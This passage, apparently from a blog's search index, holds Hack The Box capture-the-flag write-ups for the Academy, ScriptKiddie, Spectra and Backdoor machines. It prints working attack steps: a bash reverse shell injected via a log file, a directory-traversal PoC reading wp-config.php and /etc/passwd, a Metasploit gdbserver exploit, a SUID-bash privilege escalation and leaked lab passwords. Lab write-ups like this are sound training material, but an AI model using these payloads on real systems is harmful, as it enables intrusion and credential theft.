1003 ( 21y4d ) groups = 1003 ( 21y4d ) uid = 1004 ( ch4p ) gid = 1004 ( ch4p ) groups = 1004 ( ch4p ) uid = 1005 ( g0blin ) gid = 1005 ( g0blin ) groups = 1005 ( g0blin ) Trying this password with the users found, I get access to the account cry0l1t3 . User Flag Found ! Privilege Escalation #2 Now looking at the users list, I noticed one user had sudo rights, lets see if I can privesc to this user... As cry0l1t3 I run linpeas again and comb through the results to find the following: + ] Checking for TTY ( sudo/su ) passwords in audit logs 1 . 08 /12/2020 02 :28:10 83 0 ? 1 sh \"su mrb3n\" ,<nl> 2 . 08 /12/2020 02 :28:13 84 0 ? 1 su \"mrb3n_Ac@d3my!\" ,<nl> /var/log/audit/audit.log.3:type = TTY msg = audit ( 1597199293 .906:84 ) : tty pid = 2520 uid = 1002 auid = 0 ses = 1 major = 4 minor = 1 comm = \"su\" data = 6D7262336E5F41634064336D79210A Looks like mrb3n performed a su with his password as the username and it got saved into the logs! Attempting this password works !! Privilege Escalation #3 Ok so lets see what sudo command mrB3n can perform. Looks like GTFOBin has something for composer.","title":"2020 12 16 academy"},{"location":"HTB/2021-03-22-scriptkiddie/","text":"Starting off with nmap PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack ttl 63 OpenSSH 8 .2p1 Ubuntu 4ubuntu0.1 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/YB1g/YHwZNvTzj8lysM+SzX6dZzRbfF24y3ywkhai4pViGEwUklIPkEvuLSGH97NJ4y8r9uUXzyoq3iuVJ/vGXiFlPCrg+QDp7UnwANBmDqbVLucKdor+JkWHJJ1h3ftpEHgol54tj+6J7ftmaOR29Iwg+FKtcyNG6PY434cfA0Pwshw6kKgFa+HWljNl+41H3WVua4QItPmrh+CrSoaA5kCe0FAP3c2uHcv2JyDjgCQxmN1GoLtlAsEznHlHI1wycNZGcHDnqxEmovPTN4qisOKEbYfy2mu1Eqq3Phv8UfybV8c60wUqGtClj3YOO1apDZKEe8eZZqy5eXU8mIO+uXcp5zxJ/Wrgng7WTguXGzQJiBHSFq52fHFvIYSuJOYEusLWkGhiyvITYLWZgnNL+qAVxZtP80ZTq+lm4cJHJZKl0OYsmqO0LjlMOMTPFyA+W2IOgAmnM+miSmSZ6n6pnSA+LE2Pj01egIhHw5+duAYxUHYOnKLVak1WWk/C68 = | 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJA31QhiIbYQMUwn/n3+qcrLiiJpYIia8HdgtwkI8JkCDm2n+j6dB3u5I17IOPXE7n5iPiW9tPF3Nb0aXmVJmlo = | 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWjCdxetuUPIPnEGrowvR7qRAR7nuhUbfFraZFmbIr4 5000 /tcp open http syn-ack ttl 63 Werkzeug httpd 0 .16.1 ( Python 3 .8.5 ) | http-methods: | _ Supported Methods: POST HEAD GET OPTIONS | _http-title: k1d ' 5 h4ck3r t00l5 Aggressive OS guesses: Linux 4 .15 - 5 .6 ( 95 % ) , Linux 5 .3 - 5 .4 ( 95 % ) , Linux 2 .6.32 ( 95 % ) , Linux 5 .0 - 5 .3 ( 95 % ) , Linux 3 .1 ( 95 % ) , Linux 3 .2 ( 95 % ) , AXIS 210A or 211 Network Camera ( Linux 2 .6.17 ) ( 94 % ) , ASUS RT-N56U WAP ( Linux 3 .4 ) ( 93 % ) , Linux 3 .16 ( 93 % ) , Linux 5 .0 ( 93 % ) Right now SSH is useless without username and password so I will focus on port 5000, browing so it I see a scriptkiddie tool This runs msfvenom in the backround for generate the payloads, googling for this I found there is a vulnerability with it and Android APK's which is an option on this page. https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/ Using metasploit unix/fileformat/metasploit_msfvenom_apk_template_cmd_inection Now I need to setup a listener locally and upload the APK to the site. Select Android, put in the IP address and add the msf.apk and click submit. logged in as kid nothing useful in this home folder, Did find a script in /home/pwn kid@scriptkiddie:/home/pwn$ cat scanlosers.sh cat scanlosers.sh #!/bin/bash log = /home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d ' ' -f3- | sort -u | while read ip ; do sh -c \"nmap --top-ports 10 -oN recon/ ${ ip } .nmap ${ ip } 2>&1 >/dev/null\" & done if [[ $( wc -l < $log ) -gt 0 ]] ; then echo -n > $log ; fi This might be used to get to user pwn, this cats a file hackers which just happens to be owned by my current user kid kid@scriptkiddie:/home/pwn$ ls -l /home/kid/logs/hackers ls -l /home/kid/logs/hackers -rw-rw-r-- 1 kid pwn 0 Feb 3 11 :46 /home/kid/logs/hackers echo \" ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4447 0>&1' #\" >> hackers what the command does is end the nmap command nmap --top-ports 10 -oN recon/ ${ ip } .nmap ${ ip } ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4447 0>&1' #\" >> hackers so nmap doesn't scan anything but execute the reverse shell. this gets me a shell as pwn running sudo -l I see I can run msf console as root pwn@scriptkiddie:/dev/shm$ sudo -l Matching Defaults entries for pwn on scriptkiddie: env_reset,mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin User pwn may run the following commands on scriptkiddie: ( root ) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole While in msfconsole we can run shell commands. msf6 > whoami [ * ] exec: whoami root msf6 > cd /root msf6 > msf6 > pwd [ * ] exec: pwd /root msf6 > dir [ * ] exec: dir root.txt snap Rooted. I could add my RSA key to the root authorized hosts and do more, but the flag is found, so I'm done.","title":"2021 03 22 scriptkiddie"},{"location":"HTB/2021-05-07-spectra/","text":"Next box is Spectra, rated easy and the OS is set to Other for this one. Starting off with the nmap I see several interesting ports open. PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack ttl 63 OpenSSH 8 .1 ( protocol 2 .0 ) | ssh-hostkey: | 4096 52 :47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a ( RSA ) | _ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDF1xom8Ljz30NltgYXTRoVI2ymBlBZn849bnFYNKwDgwvW9naxom8pe9mzV+I8pAb5AHeVdok7szaIke7nXINK5GdHw+P529fkRNfmq4V63RUmYNKeAZmfGubCQDwGHP0Gj8S/C1lCMp/9kdNPxDv8aamWTeVCTuqDOwMy0GmEGRyk9gaZjwA2T3kIVD/TjLVu5hkpwdoQHr0JYhJRqLKHqZqdcZY7vqUFuECqcgVZ0Sj52/VnT5lis+N3hZK1MqJW2vlPhdlXhESF2O2Z0gzVtnAMB8yT68pbcRUbl6OI0NC6ucKzSIb6g90vwF1kVlj22GXTcfu0r3tyCFlusJFnuhgAIrTax8eQu5W+vLAAM0pbMizVNOEzd4VtBpLBHunEkzDknUZn3k9X3XP9NsIReMW+T8XiLTSxZuve8EWdaIfXoAeUlj0Tsy2iwYfLk6XaO5xssZgHFvB4QnUvpdt2ybsfTEd1aySikuetak9pl7yECFD8jgqT6ybzG1qsTMsdsJz6o871al1r0Dyd76R0Dr3+dO7AhLJtPszZHJXK3YqCqF/qU6kNIPMTIXdiVEuYQ1JieYzyjN3CivzVUPFnvOu2+dD5kFQSQNqR8kHGRqZXW0oUQsDUh1GQsb+iO8sFMDIAqr1SfAKQEpCPpSFl6H1wtNHW8pJJNwj1FkKNXw == 80 /tcp open http syn-ack ttl 63 nginx 1 .17.4 | http-methods: | _ Supported Methods: GET HEAD | _http-server-header: nginx/1.17.4 | _http-title: Site doesn ' t have a title ( text/html ) . 3306 /tcp open mysql syn-ack ttl 63 MySQL ( unauthorized ) Right away I want to see what's on the website they are hosting. Hovering over the first link I see it redirects me to http://spectra.htb , so I add that to my hosts file and click the link and I'm faced with a wordpress site. Second link only shows an error trying to connect to a database. BUT, removing the index.html from the URL I am presented with the site folder contents. Looking over the files in the folder I see one that is a backup of the wp-config.php.save , opening this page then viewing the source I find something juicy. // ** MySQL set tings - You can get this info from your web host ** // /** The name of the database for WordPress */ define ( 'DB_NAME' , 'dev' ); /** MySQL database username */ define ( 'DB_USER' , 'devtest' ); /** MySQL database password */ define ( 'DB_PASSWORD' , 'devteam01' ); /** MySQL hostname */ define ( 'DB_HOST' , 'localhost' ); /** Database Charset to use in creating database tables. */ define ( 'DB_CHARSET' , 'utf8' ); /** The Database Collate type. Don't change this if in doubt. */ define ( 'DB_COLLATE' , '' ); Taking a step back at what I have here, it looks like I have a Production site and the testing site. The creds I just found are for the testing side. Now to see if I can login to something with this. Going back to the Software Issue Tracker since it's a wordpress site and at the bottom of the site is a login page :) I need a username now... running wpscan to enumerate users for me. [ i ] User ( s ) Identified: [ + ] administrator | Found By: Author Posts - Display Name ( Passive Detection ) | Confirmed By: | Rss Generator ( Passive Detection ) | Author Id Brute Forcing - Author Pattern ( Aggressive Detection ) | Login Error Messages ( Aggressive Detection ) wordpress has a well known MSF module for gaining reverse shell when you know the admin cred unix/webapp/wp_admin_shell_upload Once connected I need to use python to get a proper shell then run linpeas for quick system enum. Combing through the results for the current user nginx, I see this box is a Host is Chromium OS 11.0_pre399094_p20200824-r6 clang version 11.0.0 This is also found: \u001bAutologin Files \u001b /etc/autologin total 4 -rw-r--r-- 1 root root 19 Feb 3 16 :43 \u001b [ 1 ; 31mpasswd /etc/autologin/passwd -rw-r--r-- 1 root root 19 Feb 3 16 :43 /etc/autologin/passwd\u001b SummerHereWeCome!! Now I try to SSH in an one of the users on the system found by linpeas and this password was successful with user katie . Running sudo -l quickly shows I can run /sbin/initctl which is used to interact with with upstart init daemon to start/stop processes. The user katie appears to have the current groups. uid = 20156 ( katie ) gid = 20157 ( katie ) groups = 20157 ( katie ) ,20158 ( developers ) Looking for files owned by the group developers yields promosing results. katie@spectra /etc/init $ find / -type f -group developers 2 >/dev/null /etc/init/test6.conf /etc/init/test7.conf /etc/init/test3.conf /etc/init/test4.conf /etc/init/test.conf /etc/init/test8.conf /etc/init/test9.conf /etc/init/test10.conf /etc/init/test2.conf /etc/init/test5.conf /etc/init/test1.conf /srv/nodetest.js So, I can run /sbin/initctl as root and I can modify a config file as the user I am logged in with :D I'm going to modify the test.conf file so that when it executes it changes the SUID to /bin/bash so I can run it as user katie to gain root shell. description \"Test node.js server\" author \"katie\" start on filesystem or runlevel [ 2345 ] stop on shutdown script chmod +s /bin/bash end script Now to run the modified script katie@spectra /etc/init $ sudo /sbin/initctl start test test start/running, process 45811 katie@spectra /etc/init $ /bin/bash -p bash-4.3# id uid = 20156 ( katie ) gid = 20157 ( katie ) euid = 0 ( root ) egid = 0 ( root ) groups = 0 ( root ) ,20157 ( katie ) ,20158 ( developers ) Rooted.","title":"2021 05 07 spectra"},{"location":"HTB/2021-06-20-backdoor/","text":"This box is Backdoor , rated an easy Linux Box. Starting off with some basic enumeration we have some nmap results below. # NMAP Nmap scan report for 10.129.238.86 Host is up, received user-set (0.028s latency). Scanned at 2021-11-23 00:18:27 EST for 674s Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8= | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk= | 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-generator: WordPress 5.8.1 |_http-title: Backdoor &#8211; Real-Life 1337/tcp open waste? syn-ack ttl 63 Viewing the page I see a site running wordpress reviewing the sourcecode it looks like it's running 5.8.1 running wpscan didn't show any vulnerabilities and googling shows this version 5.8.1 fixes many bugs, so I think I will look at the plugins installed. WordPress API http://backdoor.htb/index.php/wp-json/wp/v2/users/ Poking around the wp-json API I find the following: WordPress Plugins Directory indexing appears to be enabled so I can see what's in the plugins folder. Googling for an expoit for this plugin I find, https://www.exploit-db.com/exploits/39575 # Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal # Exploit Author: Wadeek # Website Author: https://github.com/Wad-Deek # Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip # Version: 1.1 # Tested on: Xampp on Windows7 [Version Disclosure] ====================================== http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt ====================================== [PoC] ====================================== /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php ====================================== Running the following I get the wp-config.php file curl http://10.129.238.86/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'wordpressuser' ); /** MySQL database password */ define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' ); /** The database collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' ); Now I have a user/pass for mysql , lets see if I can get the passwd file for a user list. $ curl http://10.129.238.86/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../etc/passwd ../../../../../../../../etc/passwd../../../../../../../../etc/passwd../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin user:x:1000:1000:user:/home/user:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false Looking at the passwd the only user is user . Attempting to login with admin and password for database failed :( Playing around with the LFI I look inside /etc/apache2/envvars curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../../var/log/nginx/access.log export APACHE_RUN_USER=www-data export APACHE_RUN_GROUP=www-data # temporary state file location. This might be changed to /run in Wheezy+1 export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid export APACHE_RUN_DIR=/var/run/apache2$SUFFIX export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX export APACHE_LOG_DIR=/var/log/apache2$SUFFIX Here I see the path to apache2 logs, then I check apache2.conf curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../../etc/apache2/apache2.conf ... ErrorLog ${APACHE_LOG_DIR}/error.log But when I try to grab access.log or error.log nothing is found, guess I can't poison the logs for RCE. Now there is anothe port opened here that I don't know much about, and since I have LFI, I can poke around the /proc folder to learn more about it. Problem here is that to lookup info on a process in /proc you need to know the PID, since I don't I will need to brute force this process. For this I will write a quick python script import requests for i in range(2000): req = requests.get('http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../proc/'+str(i)+'/status') if '\\n' in req.text: print(req.text) Going through the list, one thing kinda stood out, gdbserver which a gdb process can be run from another system. The process was running on port 998, now to make sure this process was running on this fancy 1337 port, I check the /proc/998/cmdline \u2500[\u2622] $ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../../proc/998/cmdline --output '998-cmdline' % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 200 100 200 0 0 3174 0 --:--:-- --:--:-- --:--:-- 3174 \u256d\u2500[us-release-1]-[10.10.14.136]-[triki@parrot]-[~/HTB/boxes/backdoor/results/backdoor.htb/exploit] \u2570\u2500 $ cat 998-cmdline ../../../../../../../../../proc/998/cmdline../../../../../../../../../proc/998/cmdline../../../../../../../../../proc/998/cmdlinegdbserver--once0.0.0.0:1337/bin/true<script>window.close()</script>% Here I see the server being started on 0.0.0.0 which means it listens on any interface on port 1337 Loading up GDB on my localsystem I am able to connect to the remote server for debugging. \u2570\u2500 $ gdb GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git Copyright (C) 2021 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: <https://www.gnu.org/software/gdb/bugs/>. Find the GDB manual and other documentation resources online at: <http://www.gnu.org/software/gdb/documentation/>. For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\". (gdb) target remote backdoor.htb:1337 Remote debugging using backdoor.htb:1337 Reading /usr/bin/true from remote target... warning: File transfers from remote targets can be slow. Use \"set sysroot\" to access files locally instead. Reading /usr/bin/true from remote target... Reading symbols from target:/usr/bin/true... Reading /usr/bin/53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading /usr/bin/.debug/53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading /usr/lib/debug//usr/bin/53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading /usr/lib/debug/usr/bin//53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... Reading target:/usr/lib/debug/usr/bin//53663829ed7ccdc4a913aa637ff91d280738f5.debug from remote target... (No debugging symbols found in target:/usr/bin/true) Reading /lib64/ld-linux-x86-64.so.2 from remote target... Reading /lib64/ld-linux-x86-64.so.2 from remote target... Reading symbols from target:/lib64/ld-linux-x86-64.so.2... Reading /lib64/ld-2.31.so from remote target... Reading /lib64/.debug/ld-2.31.so from remote target... Reading /usr/lib/debug//lib64/ld-2.31.so from remote target... Reading /usr/lib/debug/lib64//ld-2.31.so from remote target... Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target... (No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2) 0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2 (gdb) Googling I find an exploit for gdbserver, lets see if it works. Kept getting failures, checked msf and found a module there which was successful. msf6 exploit(multi/gdb/gdb_server_exec) > run [*] Started reverse TCP handler on 10.10.14.136:4444 [*] 10.129.239.164:1337 - Performing handshake with gdbserver... [*] 10.129.239.164:1337 - Stepping program to find PC... [*] 10.129.239.164:1337 - Writing payload at 00007ffff7fd0103... [*] 10.129.239.164:1337 - Executing the payload... [*] Sending stage (3012548 bytes) to 10.129.239.164 [*] Meterpreter session 1 opened (10.10.14.136:4444 -> 10.129.239.164:41658) at 2021-11-24 14:25:39 -0500 meterpreter > id [-] Unknown command: id meterpreter > ls Listing: /home/user =================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 20666/rw-rw-rw- 0 cha 2021-11-23 22:31:04 -0500 .bash_history 100644/rw-r--r-- 3771 fil 2021-11-10 09:18:37 -0500 .bashrc 40700/rwx------ 4096 dir 2021-11-10 09:18:39 -0500 .cache 40700/rwx------ 4096 dir 2021-11-10 09:18:39 -0500 .config 40700/rwx------ 4096 dir 2021-11-10 09:18:39 -0500 .gnupg 40775/rwxrwxr-x 4096 dir 2021-11-10 09:18:39 -0500 .local 100644/rw-r--r-- 807 fil 2021-11-10 09:18:37 -0500 .profile 100640/rw-r----- 33 fil 2021-11-23 22:32:14 -0500 user.txt meterpreter > cat user.txt 83590e59ece48d08e12d08a237cb84ee User flag found. Privesc I remember I have a mysql login, after poking around nothing really useful, I mean I have the admin password hash for WordPress, but I already have a shell so, ya, moving along :) After running linpeas I noticed this process running as root which calls the screen process without the full path, I'm thinking I can hijack this process running as root. root 961 0.0 0.0 2608 1668 ? Ss 03:31 0:29 _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done Linpeas shows screen having SUID set. user@Backdoor:/tmp$ screen -x root/root screen -x root/root root@Backdoor:~# ls -ltr ls -ltr total 4 -rw-r--r-- 1 root root 33 Nov 24 03:32 root.txt root@Backdoor:~# cat root.txt cat root.txt f8a2c333b247522bd9375847570e201b ROOTED","title":"2021 06 20 backdoor"},{"location":"HTB/2021-06-20-backdoor/#wordpress-api","text":"http://backdoor.htb/index.php/wp-json/wp/v2/users/ Poking around the wp-json API I find the following:","title":"WordPress API"},{"location":"HTB/2021-06-20-backdoor/#wordpress-plugins","text":"Directory indexing appears to be enabled so I can see what's in the plugins folder. Googling for an expoit for this plugin I find, https://www.exploit-db.com/exploits/39575 # Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal # Exploit Author: Wadeek # Website Author: https://github.com/Wad-Deek # Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip # Version: 1.1 # Tested on: Xampp on Windows7 [Version Disclosure] ====================================== http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt ====================================== [PoC] ====================================== /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php ====================================== Running the following I get the wp-config.php file curl http://10.129.238.86/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'wordpressuser' ); /** MySQL database password */ define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' ); /** The database collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' ); Now I have a user/pass for mysql , lets see if I can get the passwd file for a user list. $ curl http://10.129.238.86/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../etc/passwd ../../../../../../../../etc/passwd../../../../../../../../etc/passwd../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin user:x:1000:1000:user:/home/user:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false Looking at the passwd the only user is user . Attempting to login with admin and password for database failed :( Playing around with the LFI I look inside /etc/apache2/envvars curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../../var/log/nginx/access.log export APACHE_RUN_USER=www-data export APACHE_RUN_GROUP=www-data # temporary state file location. This might be changed to /run in Wheezy+1 export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid export APACHE_RUN_DIR=/var/run/apache2$SUFFIX export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX export APACHE_LOG_DIR=/var/log/apache2$SUFFIX Here I see the path to apache2 logs, then I check apache2.conf curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../../etc/apache2/apache2.conf ... ErrorLog ${APACHE_LOG_DIR}/error.log But when I try to grab access.log or error.log nothing is found, guess I can't poison the logs for RCE. Now there is anothe port opened here that I don't know much about, and since I have LFI, I can poke around the /proc folder to learn more about it. Problem here is that to lookup info on a process in /proc you need to know the PID, since I don't I will need to brute force this process. For this I will write a quick python script import requests for i in range(2000): req = requests.get('http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../proc/'+str(i)+'/status') if '\\n' in req.text: print(req.text) Going through the list, one thing kinda stood out, gdbserver which a gdb process can be run from another system. The process was running on port 998, now to make sure this process was running on this fancy 1337 port, I check the /proc/998/cmdline \u2500[\u2622] $ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl\\=../../../../../../../../../proc/998/cmdline --output '998-cmdline' % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 200 100 200 0 0 3174 0 --:--:-- --:--:-- --:--:-- 